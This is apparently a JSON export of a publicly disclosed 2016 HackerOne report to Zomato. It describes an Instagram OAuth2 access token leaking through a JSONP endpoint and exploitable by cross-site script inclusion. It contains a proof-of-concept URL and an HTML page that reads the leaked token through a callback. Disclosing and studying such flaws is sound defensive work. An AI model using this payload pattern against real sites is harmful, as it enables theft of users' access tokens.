{
    "abilities": {
        "can_manage_common_responses?": false, 
        "can_manage_collaborators?": false, 
        "can_reopen?": false, 
        "can_ban_researcher?": false, 
        "can_create_severity?": false, 
        "can_assign_to_h1_triage?": false, 
        "can_agree_on_going_public?": false, 
        "assignable_team_member_groups": [], 
        "can_view_credential_account_details?": false, 
        "can_export?": false, 
        "can_create_retest?": false, 
        "can_assign_to_user?": false, 
        "can_use_common_responses?": false, 
        "can_hide_timeline?": false, 
        "can_be_manually_disclosed?": false, 
        "assignable_team_members": [], 
        "can_clone?": false, 
        "can_be_publicly_disclosed?": false, 
        "can_close_comments?": false, 
        "can_view_bounty_weights?": false, 
        "can_suggest_bounty_amount?": false, 
        "can_cancel_disclosure_request?": false, 
        "can_redact?": false, 
        "can_change_structured_scope?": false, 
        "can_post_internal_comments?": false, 
        "can_change_state?": false, 
        "can_change_weakness?": false, 
        "can_add_comment?": false, 
        "can_reassign_to_team?": false, 
        "can_change_title?": false, 
        "can_award_bounty?": false, 
        "can_award_swag?": false, 
        "can_close?": false, 
        "can_manage?": false
    }, 
    "comments_closed?": false, 
    "substate": "resolved", 
    "bug_reporter_agreed_on_going_public_at": "2016-06-22T11:04:11.754Z", 
    "voters": [
        "bogdantcaciuc", 
        "sasi2103", 
        "mahmoud_osama", 
        "zeroknife", 
        "dyabla", 
        "pei", 
        "abdulxhannan"
    ], 
    "facebook_team?": false, 
    "has_bounty?": false, 
    "rejected_anc_report_that_can_be_sent_back_to_anc_triagers?": false, 
    "original_report_id": null, 
    "id": 138270, 
    "can_view_team": true, 
    "team_member_agreed_on_going_public_at": "2016-06-22T11:33:44.482Z", 
    "activity_page_count": 1, 
    "activity_page_number": 1, 
    "title": "Instagram OAuth2 Implementation Leaks Access Token; Allows for Cross-Site Script Inclusion (XSSI)", 
    "is_member_of_team?": null, 
    "vote_count": 7, 
    "summaries": [
        {
            "category": "team", 
            "can_create?": false, 
            "can_view?": true
        }, 
        {
            "category": "researcher", 
            "can_create?": false, 
            "can_view?": true
        }
    ], 
    "structured_scope": null, 
    "allow_singular_disclosure_at": "2016-07-22T11:04:11.861Z", 
    "state": "Closed", 
    "cve_ids": [], 
    "readable_substate": "Resolved", 
    "public": true, 
    "attachments": [
        {
            "file_name": "instagram-oauth2-atleak.png", 
            "type": "image/png", 
            "id": 93245, 
            "expiring_url": "https://hackerone-us-west-2-production-attachments.s3-us-west-2.amazonaws.com/000/093/245/452409d977e2c348565e9fee8e25e00d78f3ca55/instagram-oauth2-atleak.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ5B43OTPE%2F20181206%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20181206T225240Z&X-Amz-Expires=3600&X-Amz-Security-Token=FQoGZXIvYXdzEA8aDCiDARkX3ArKGaO7%2ByK3A39tqjzyooRkX4qPdNM7MkAemep3r5%2Fh%2B11ZdH6KbZ8q2cgU%2FRMODKRq75fJ6sn%2FkR1fBrPaMFfKsP%2BSLpkSrkbyi968FqbmO6yo59Heb3d1kDMwzaNShj3ou%2Fq9qAc5NWgXlxJtABJqkgxPd5NovxMOsASin8kfBjU8OhOOEnonvd2t16oF509MVoA81P%2Frmr4njIb3UfHzYyccuDQNjHM0qV7B57bCKQeIuO%2FzLl7au%2FWR2v6R6bwK6fGUYVbcnAam9GqobWJnMl6NFbipNSdmUzB5%2BglRYaYeGXxbgxseM7SSFeehfzbywUoHEf4Ve61V1e90uyx3M0Krbm5QjS5gNgwErj0g2rC2mkrl2q%2B9ADfOzgMAX8fUODFalEv4gZf0ZKuLhpmAzEapJE5f%2BarcSkdn5b0ddy4Wa2vdsZ6lQ5NOez8qkcnaBEJZLnv3YGHyInLrIaUkqlq4iavZpr4f5Al5PueqIzLuItn5ztJjfvCu5dDIplWP0eo6r%2BIUCKsDwUNkRSgWCtJbCfl%2BPF3PKHjvnmVEBawLZlpXvaOGUvA%2FKYb2cGGXn89CPjYlwpWCj2J8Z%2B0okbim4AU%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=ee5c8d9b72d3c4e2260f48a5f95057b997f6ae1f6646d572112123df16d3aee8"
        }
    ], 
    "singular_disclosure_disabled": true, 
    "activities": [
        {
            "automated_response": false, 
            "created_at": "2016-05-31T05:58:57.737Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2016-05-31T05:58:57.737Z", 
            "actor": {
                "username": "vinothzomato", 
                "url": "/vinothzomato", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/059/568/768e852df4ea2bd9087c117fbe7279b8da36b701_medium.jpg?1496138727"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "zomato", 
            "message": "Hi @dejavuln,\nThanks for your report.\nWe are investigating this issue.", 
            "markdown_message": "<p>Hi <a href=\"/dejavuln\">@dejavuln</a>,<br>\nThanks for your report.<br>\nWe are investigating this issue.</p>\n", 
            "type": "Activities::BugTriaged", 
            "id": 991761, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "reporter": {
                "username": "dejavuln", 
                "url": "/dejavuln"
            }, 
            "created_at": "2016-05-31T10:58:46.368Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2016-05-31T10:58:46.368Z", 
            "actor": {
                "username": "vinothzomato", 
                "url": "/vinothzomato", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/059/568/768e852df4ea2bd9087c117fbe7279b8da36b701_medium.jpg?1496138727"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "zomato", 
            "message": "Thanks for keeping @Zomato safe.", 
            "markdown_message": "<p>Thanks for keeping <a href=\"/zomato\">@Zomato</a> safe.</p>\n", 
            "type": "Activities::BugResolved", 
            "id": 992142, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2016-06-22T11:04:11.800Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2016-06-22T11:04:11.800Z", 
            "actor": {
                "username": "dejavuln", 
                "url": "/dejavuln", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/045/064/5981b4f8a64f2637b643f797be2e18f302ce9875_medium.png?1457363129"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "zomato", 
            "first_to_agree": true, 
            "message": "", 
            "markdown_message": "", 
            "type": "Activities::AgreedOnGoingPublic", 
            "id": 1028065, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2016-06-22T11:33:44.503Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2016-06-22T11:33:44.503Z", 
            "actor": {
                "username": "vinothzomato", 
                "url": "/vinothzomato", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/059/568/768e852df4ea2bd9087c117fbe7279b8da36b701_medium.jpg?1496138727"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "zomato", 
            "message": "", 
            "markdown_message": "", 
            "type": "Activities::AgreedOnGoingPublic", 
            "id": 1028102, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2016-06-22T11:33:44.611Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2016-06-22T11:33:44.611Z", 
            "actor": {
                "username": "vinothzomato", 
                "url": "/vinothzomato", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/059/568/768e852df4ea2bd9087c117fbe7279b8da36b701_medium.jpg?1496138727"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "zomato", 
            "message": "", 
            "markdown_message": "", 
            "type": "Activities::ReportBecamePublic", 
            "id": 1028103, 
            "genius_execution_id": null
        }
    ], 
    "in_validation?": false, 
    "is_participant": false, 
    "singular_disclosure_allowed": true, 
    "reporter": {
        "username": "dejavuln", 
        "hacker_mediation": false, 
        "hackerone_triager": false, 
        "disabled": false, 
        "url": "/dejavuln", 
        "profile_picture_urls": {
            "small": "https://profile-photos.hackerone-user-content.com/000/045/064/555bf3cfde9b926ac3540de3f4acc94325696e05_small.png?1457363129"
        }, 
        "is_me?": false
    }, 
    "weakness": {
        "id": 18, 
        "name": "Information Disclosure"
    }, 
    "is_external_bug": false, 
    "visibility": "full", 
    "allow_singular_disclosure_after": -74951308.37632869, 
    "disclosed_at": "2016-06-22T11:33:44.588Z", 
    "stage": 4, 
    "url": "https://hackerone.com/reports/138270", 
    "created_at": "2016-05-12T12:11:56.128Z", 
    "original_report_url": null, 
    "vulnerability_information_html": "<p>Once a user connects his Zomato account to Instagram (via OAuth2), the page <code>https://www.zomato.com/php/instagram_tag_relay</code> leaks the Instagram OAuth2 Access Token issued to Zomato:</p>\n\n<p>PoC:<br>\n<code>https://www.zomato.com/php/instagram_tag_relay?callback=aaabc</code></p>\n\n<p>Result (personal data x&#39;ed):</p>\n<pre class=\"highlight plaintext\"><code>HTTP/1.1 200 OK\n[...]\nContent-Type: text/html; charset=UTF-8\n[...]\naaabc({&quot;data&quot;:[],&quot;relay_summary&quot;:{&quot;fresh_img_request_ongoing&quot;:false,&quot;new_imgs_fetched&quot;:true},&quot;pagination&quot;:[],&quot;tag&quot;:&quot;zomato&quot;,&quot;user&quot;:{&quot;user_id&quot;:&quot;3184xxxx&quot;,&quot;access_token&quot;:&quot;3184371440.87c9ab8.xxxxxxxxxxxxxxxxxxxx&quot;,&quot;username&quot;:&quot;xxxxxxx&quot;,&quot;profile_picture&quot;:&quot;https:\\/\\/igcdn-photos-e-a.akamaihd.net\\/hphotos-ak-xft1\\/t51.2885-19\\/11906329_960xxxxxxxxxxxxx.jpg&quot;,&quot;email&quot;:&quot;xxxxxx@example.org&quot;},&quot;request&quot;:{&quot;callback&quot;:&quot;aaabc&quot;}})\n</code></pre>\n<p>This is the result of a <u><strong>design issue</strong></u>: Zomato is using the OAuth2 Server-Side Flow where an Authorization Code is exchanged for an Access Token. The exchange happens server-side; there should be no need to later expose the Access Token to the end-user as it significantly increases the risk of Access Token leakage.</p>\n\n<p>Due to a <u><strong>separate vulnerability</strong></u>, gaining access to this Access Token becomes indeed quite easy. An attacker might craft an HTML page, embed the vulnerable page as a script and receive the page content at the function referenced via the <code>callback</code> parameter. </p>\n\n<p>PoC:</p>\n<pre class=\"highlight html\"><code><span class=\"nt\">&lt;html&gt;</span>\n<span class=\"nt\">&lt;script&gt;</span>\n<span class=\"kd\">function</span> <span class=\"nx\">aaabc</span><span class=\"p\">(</span><span class=\"nx\">s</span><span class=\"p\">)</span>\n<span class=\"p\">{</span>\n<span class=\"nx\">alert</span><span class=\"p\">(</span><span class=\"nx\">JSON</span><span class=\"p\">.</span><span class=\"nx\">stringify</span><span class=\"p\">(</span><span class=\"nx\">s</span><span class=\"p\">));</span>\n<span class=\"p\">}</span>\n<span class=\"nt\">&lt;/script&gt;</span>\n\n<span class=\"nt\">&lt;script </span><span class=\"na\">src=</span><span class=\"s\">&quot;https://www.zomato.com/php/instagram_tag_relay?callback=aaabc&quot;</span><span class=\"nt\">&gt;&lt;/script&gt;</span>\n\n<span class=\"nt\">&lt;/html&gt;</span>\n</code></pre>\n<p>Result: <br>\n<a href=\"#\" class=\"markdown-attachment-link markdown-attachment-reference\" data-attachment-filename=\"instagram-oauth2-atleak.png\" data-attachment-link=\"https://hackerone-us-west-2-production-attachments.s3-us-west-2.amazonaws.com/000/093/245/452409d977e2c348565e9fee8e25e00d78f3ca55/instagram-oauth2-atleak.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&amp;X-Amz-Credential=ASIAQGK6FURQ5B43OTPE%2F20181206%2Fus-west-2%2Fs3%2Faws4_request&amp;X-Amz-Date=20181206T225240Z&amp;X-Amz-Expires=3600&amp;X-Amz-Security-Token=FQoGZXIvYXdzEA8aDCiDARkX3ArKGaO7%2ByK3A39tqjzyooRkX4qPdNM7MkAemep3r5%2Fh%2B11ZdH6KbZ8q2cgU%2FRMODKRq75fJ6sn%2FkR1fBrPaMFfKsP%2BSLpkSrkbyi968FqbmO6yo59Heb3d1kDMwzaNShj3ou%2Fq9qAc5NWgXlxJtABJqkgxPd5NovxMOsASin8kfBjU8OhOOEnonvd2t16oF509MVoA81P%2Frmr4njIb3UfHzYyccuDQNjHM0qV7B57bCKQeIuO%2FzLl7au%2FWR2v6R6bwK6fGUYVbcnAam9GqobWJnMl6NFbipNSdmUzB5%2BglRYaYeGXxbgxseM7SSFeehfzbywUoHEf4Ve61V1e90uyx3M0Krbm5QjS5gNgwErj0g2rC2mkrl2q%2B9ADfOzgMAX8fUODFalEv4gZf0ZKuLhpmAzEapJE5f%2BarcSkdn5b0ddy4Wa2vdsZ6lQ5NOez8qkcnaBEJZLnv3YGHyInLrIaUkqlq4iavZpr4f5Al5PueqIzLuItn5ztJjfvCu5dDIplWP0eo6r%2BIUCKsDwUNkRSgWCtJbCfl%2BPF3PKHjvnmVEBawLZlpXvaOGUvA%2FKYb2cGGXn89CPjYlwpWCj2J8Z%2B0okbim4AU%3D&amp;X-Amz-SignedHeaders=host&amp;X-Amz-Signature=ee5c8d9b72d3c4e2260f48a5f95057b997f6ae1f6646d572112123df16d3aee8\" data-attachment-type=\"image/png\">instagram-oauth2-atleak.png (F93245)</a> </p>\n\n<p>Please note these are actually two separate issues: </p>\n\n<ol>\n<li>The OAuth2 Access Token should not be exposed to the end-user in the first place. </li>\n<li>XSSI / Cross-Site Script Inclusion: sensitive data should not be made accessible in a way that allows it to be processed by a potentially malicious web page.</li>\n</ol>\n", 
    "vulnerability_information": "Once a user connects his Zomato account to Instagram (via OAuth2), the page `https://www.zomato.com/php/instagram_tag_relay` leaks the Instagram OAuth2 Access Token issued to Zomato:\n\nPoC:\n`https://www.zomato.com/php/instagram_tag_relay?callback=aaabc`\n\nResult (personal data x'ed):\n```\nHTTP/1.1 200 OK\n[...]\nContent-Type: text/html; charset=UTF-8\n[...]\naaabc({\"data\":[],\"relay_summary\":{\"fresh_img_request_ongoing\":false,\"new_imgs_fetched\":true},\"pagination\":[],\"tag\":\"zomato\",\"user\":{\"user_id\":\"3184xxxx\",\"access_token\":\"3184371440.87c9ab8.xxxxxxxxxxxxxxxxxxxx\",\"username\":\"xxxxxxx\",\"profile_picture\":\"https:\\/\\/igcdn-photos-e-a.akamaihd.net\\/hphotos-ak-xft1\\/t51.2885-19\\/11906329_960xxxxxxxxxxxxx.jpg\",\"email\":\"xxxxxx@example.org\"},\"request\":{\"callback\":\"aaabc\"}})\n```\n\nThis is the result of a _**design issue**_: Zomato is using the OAuth2 Server-Side Flow where an Authorization Code is exchanged for an Access Token. The exchange happens server-side; there should be no need to later expose the Access Token to the end-user as it significantly increases the risk of Access Token leakage.\n\nDue to a _**separate vulnerability**_, gaining access to this Access Token becomes indeed quite easy. An attacker might craft an HTML page, embed the vulnerable page as a script and receive the page content at the function referenced via the `callback` parameter. \n\nPoC:\n```\n<html>\n<script>\nfunction aaabc(s)\n{\nalert(JSON.stringify(s));\n}\n</script>\n\n<script src=\"https://www.zomato.com/php/instagram_tag_relay?callback=aaabc\"></script>\n\n</html>\n```\n\nResult: \nF93245 \n\nPlease note these are actually two separate issues: \n1. The OAuth2 Access Token should not be exposed to the end-user in the first place. \n2. XSSI / Cross-Site Script Inclusion: sensitive data should not be made accessible in a way that allows it to be processed by a potentially malicious web page.\n", 
    "team_private?": false, 
    "team": {
        "profile": {
            "website": "https://www.zomato.com", 
            "about": "The fastest way to search for great places to eat at and order from around you. Serving 24 countries worldwide.", 
            "twitter_handle": "Zomato", 
            "name": "Zomato"
        }, 
        "handle": "zomato", 
        "url": "https://hackerone.com/zomato", 
        "state": "public_mode", 
        "profile_picture_urls": {
            "small": "https://profile-photos.hackerone-user-content.com/000/002/943/7b54bc7a4a265c47ec0d946a6abf079078b82401_small.png?1526447675", 
            "medium": "https://profile-photos.hackerone-user-content.com/000/002/943/dbb71f3e2a0e73fe819c0c2a3e4fbcdd24d138e9_medium.png?1526447675"
        }, 
        "awards_miles": false, 
        "permissions": [], 
        "id": 2943, 
        "default_currency": "usd"
    }, 
    "is_published": false
}